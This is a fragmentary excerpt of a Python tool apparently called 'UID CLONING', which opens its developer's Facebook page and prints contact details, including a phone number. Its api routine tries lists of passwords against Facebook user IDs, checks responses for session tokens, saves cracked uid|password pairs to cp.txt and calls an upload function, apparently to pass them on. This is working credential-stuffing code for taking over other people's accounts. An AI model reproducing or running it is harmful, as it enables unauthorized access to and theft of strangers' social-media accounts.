...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/Ajmir.Hossain.008"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/Ajmir.Hossain.008")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> DX-AJMIR ")
	subprocess.check_output(["am", "start", "https://www.facebook.com/Ajmir.Hossain.008"])
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            Ajmir Hossain
     \033[1;91m➣ \033[1;92mFACEBOOK   :            DX Ajmir Hossain 
     \033[1;93m➣ \033[1;92mWHATSAPP   :            01813225678
     \033[1;96m➣ \033[1;92mGITHUB     :            DX-142 
     \033[1;95m➣ \033[1;92mTOOLS      :            UID CLONING
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
    """)
		print("%s [%sâ€¢%s] %sTOOL NAME : %sUID CLONING"%(G,R,G,Y,G))
...
#				exit()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [DX] : \033[0;97m %s/%s -> \033[0;92m [ABIR -OK:%s ]- \033[0;93m[ABIR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
    ...
    'viewport-width': '980',
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[DX-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [DX-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
